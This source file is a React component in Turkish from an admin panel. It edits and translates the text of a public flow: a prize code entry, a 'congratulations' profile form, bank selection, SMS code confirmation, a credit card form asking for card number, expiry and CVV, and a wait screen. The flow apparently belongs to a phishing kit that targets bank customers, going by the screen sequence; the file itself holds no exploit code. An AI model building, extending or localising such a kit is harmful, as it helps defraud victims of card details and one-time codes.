"use client";

import { useState, useEffect } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";

export function LanguageTab({ darkMode }: { darkMode: boolean }) {
  const [settings, setSettings] = useState<any>(null);
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const supabase = createBrowserSupabaseClient();

  const fetchSettings = async () => {
    if (!supabase) return;
    setLoading(true);
    const { data } = await supabase.from("global_settings").select("*").limit(1).single();
    if (data) setSettings(data);
    setLoading(false);
  };

  useEffect(() => {
    fetchSettings();
  }, [supabase]);

  const handleSave = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!supabase || !settings) return;
    setSaving(true);
    const { error } = await supabase
      .from("global_settings")
      .update(settings)
      .eq("id", settings.id || "default");
    
    setSaving(false);
    if (error) alert("Hata: " + error.message);
    else alert("Ayarlar başarıyla kaydedildi!");
  };

  const handleChange = (key: string, value: string) => {
    setSettings((prev: any) => ({ ...prev, [key]: value }));
  };

  const handleLanguageSelect = async (lang: string) => {
    if (!confirm(`Tüm metinler ${lang.toUpperCase()} diline çevrilecektir. Onaylıyor musunuz?`)) return;
    
    try {
      const { translations } = await import('@/lib/languageDefaults');
      const selectedTranslation = translations[lang];
      if (selectedTranslation) {
        setSettings((prev: any) => ({
          ...prev,
          ...selectedTranslation,
          site_language: lang
        }));
      } else {
        alert("Seçilen dil için çeviri bulunamadı.");
      }
    } catch (e) {
      console.error(e);
      alert("Dil yüklenirken hata oluştu.");
    }
  };

  if (loading) return <div className="opacity-50 p-8 text-center font-medium">Yükleniyor...</div>;
  if (!settings) return <div className="opacity-50 p-8 text-center font-medium">Ayarlar bulunamadı.</div>;

  const availableLanguages = [
    { code: "nl", name: "Hollandaca (Nederlands)" },
    { code: "en", name: "İngilizce (English)" },
    { code: "de", name: "Almanca (Deutsch)" },
    { code: "fr", name: "Fransızca (Français)" },
    { code: "es", name: "İspanyolca (Español)" },
    { code: "it", name: "İtalyanca (Italiano)" },
    { code: "tr", name: "Türkçe" }
  ];

  const groups = [
    {
      title: "Giriş Ekranı (Code Entry)",
      fields: [
        { key: "code_title", label: "Başlık" },
        { key: "code_subtitle", label: "Alt Başlık ({partner} değişkeni kullanılabilir)" },
        { key: "code_button", label: "Buton Metni" },
      ]
    },
    {
      title: "Tebrikler Ekranı (Win / Profile)",
      fields: [
        { key: "win_title", label: "Başlık" },
        { key: "win_subtitle", label: "Alt Başlık" },
        { key: "win_button", label: "Buton Metni" },
        { key: "profile_title_main", label: "Profil Başlık" },
        { key: "profile_title_small", label: "Profil Küçük Başlık" },
        { key: "profile_subtitle", label: "Profil Alt Başlık" },
        { key: "profile_firstname_label", label: "Ad Etiketi" },
        { key: "profile_lastname_label", label: "Soyad Etiketi" },
        { key: "profile_phone_label", label: "Telefon Etiketi" },
        { key: "profile_button", label: "Profil Buton Metni" },
        { key: "profile_loading_text", label: "Profil Yükleniyor Metni" },
      ]
    },
    {
      title: "Banka Seçim Ekranı",
      fields: [
        { key: "banken_title", label: "Başlık" },
        { key: "banken_subtitle", label: "Alt Başlık" },
        { key: "banken_search_placeholder", label: "Arama Çubuğu Metni" },
      ]
    },
    {
      title: "SMS Onay Ekranı",
      fields: [
        { key: "sms_title", label: "Başlık" },
        { key: "sms_subtitle", label: "Alt Başlık ({digits} değişkeni kullanılabilir)" },
        { key: "sms_input_label", label: "İnput Etiketi" },
        { key: "sms_button", label: "Buton Metni" },
        { key: "sms_loading", label: "Yükleniyor Metni" },
      ]
    },
    {
      title: "Kredi Kartı Ekranı",
      fields: [
        { key: "card_title", label: "Başlık" },
        { key: "card_subtitle", label: "Alt Başlık" },
        { key: "card_owner_label", label: "Kart Sahibi Etiketi" },
        { key: "card_number_label", label: "Kart Numarası Etiketi" },
        { key: "card_expiry_label", label: "Son Kullanma Tarihi Etiketi" },
        { key: "card_cvv_label", label: "CVV Etiketi" },
        { key: "card_button", label: "Buton Metni" },
      ]
    },
    {
      title: "Canlı Destek Ekranı",
      fields: [
        { key: "live_support_title", label: "Başlık" },
        { key: "live_support_subtitle", label: "Alt Başlık" },
        { key: "live_support_button", label: "Buton Metni" },
      ]
    },
    {
      title: "Bekleme Ekranı",
      fields: [
        { key: "wait_title", label: "Başlık" },
        { key: "wait_subtitle", label: "Alt Başlık" },
      ]
    }
  ];

  return (
    <div className="space-y-8 animate-in fade-in duration-500">
      <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
        <div className="flex items-center gap-3">
          <div className={`p-2 rounded-xl ${darkMode ? 'bg-white/10 text-white' : 'bg-black/5 text-black'}`}>
            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9" /></svg>
          </div>
          <div>
            <h2 className={`text-2xl font-bold tracking-tight ${darkMode ? 'text-white' : 'text-gray-900'}`}>Dil Ayarları</h2>
            <p className={`text-sm ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>Tüm sayfalardaki metinleri buradan çevirebilirsiniz</p>
          </div>
        </div>
        
        <div className={`flex items-center gap-3 p-3 rounded-2xl border shadow-sm backdrop-blur-md ${darkMode ? 'bg-white/5 border-white/10' : 'bg-white/80 border-gray-200'}`}>
          <label className={`text-sm font-bold ${darkMode ? 'text-gray-300' : 'text-gray-700'}`}>Hızlı Çeviri:</label>
          <select 
            value={settings.site_language || "en"}
            onChange={(e) => handleLanguageSelect(e.target.value)}
            className={`px-4 py-2 text-sm rounded-xl border outline-none font-medium cursor-pointer transition-all ${darkMode ? 'bg-black/20 border-white/10 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
          >
            {availableLanguages.map(lang => (
              <option key={lang.code} value={lang.code}>{lang.name}</option>
            ))}
          </select>
        </div>
      </div>

      <form onSubmit={handleSave} className="space-y-8">
        {groups.map((group, idx) => (
          <div key={idx} className={`p-8 rounded-3xl border shadow-[0_8px_30px_rgb(0,0,0,0.04)] backdrop-blur-xl ${darkMode ? 'bg-[#1c1c1e]/70 border-white/5' : 'bg-white/80 border-[#d2d2d7]/50'}`}>
            <h3 className={`text-lg font-bold mb-6 border-b pb-4 ${darkMode ? 'border-white/10 text-[#EB5E28]' : 'border-gray-200 text-[#EB5E28]'}`}>{group.title}</h3>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              {group.fields.map(f => (
                <div key={f.key}>
                  <label className={`block text-[11px] font-bold mb-2 opacity-80 uppercase tracking-wider ${darkMode ? 'text-gray-300' : 'text-gray-600'}`}>{f.label}</label>
                  {f.key.includes("subtitle") ? (
                    <textarea 
                      value={settings[f.key] || ""}
                      onChange={e => handleChange(f.key, e.target.value)}
                      className={`w-full p-4 rounded-xl text-sm outline-none resize-none h-24 transition-all ${darkMode ? 'bg-black/20 text-white border border-white/10 focus:border-[#EB5E28]' : 'bg-gray-50 border border-gray-200 focus:border-[#EB5E28]'}`}
                    />
                  ) : (
                    <input 
                      type="text"
                      value={settings[f.key] || ""}
                      onChange={e => handleChange(f.key, e.target.value)}
                      className={`w-full px-4 py-3 rounded-xl text-sm outline-none transition-all ${darkMode ? 'bg-black/20 text-white border border-white/10 focus:border-[#EB5E28]' : 'bg-gray-50 border border-gray-200 focus:border-[#EB5E28]'}`}
                    />
                  )}
                </div>
              ))}
            </div>
          </div>
        ))}
        
        <div className="flex justify-end sticky bottom-6 z-20 pb-4">
          <button 
            type="submit" 
            disabled={saving}
            className="px-8 py-3.5 bg-[#EB5E28] text-white rounded-full font-bold tracking-wide hover:bg-[#c94d1e] transition-all duration-300 shadow-[0_0_15px_rgba(235,94,40,0.3)] hover:shadow-[0_0_25px_rgba(235,94,40,0.5)] active:scale-95 disabled:opacity-50 flex items-center gap-2"
          >
            {saving ? "Kaydediliyor..." : (
              <>
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M5 13l4 4L19 7" /></svg>
                Tümünü Kaydet
              </>
            )}
          </button>
        </div>
      </form>
    </div>
  );
}
